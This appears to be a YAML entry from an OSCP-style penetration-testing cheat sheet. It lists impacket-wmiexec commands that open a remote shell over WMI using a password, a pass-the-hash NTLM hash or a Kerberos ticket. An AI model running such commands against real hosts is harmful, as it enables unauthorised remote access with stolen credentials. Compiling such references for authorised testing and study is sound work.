---
variants:
  - label: creds
    command: |
      impacket-wmiexec $DOMAIN/$USER:$PASSWORD@$IP
  - label: hash
    command: |
      impacket-wmiexec -hashes :$HASH $DOMAIN/$USER@$IP
  - label: ticket
    command: |
      impacket-wmiexec -k -no-pass $DOMAIN/$USER@$IP
description: Semi-interactive shell on a remote host via WMI, by auth method.
os: [Linux]
category: [oscp, cli]
have: [hash, ticket]
service: [SMB]
phase: [Exploitation]
references:
  - https://github.com/fortra/impacket
---
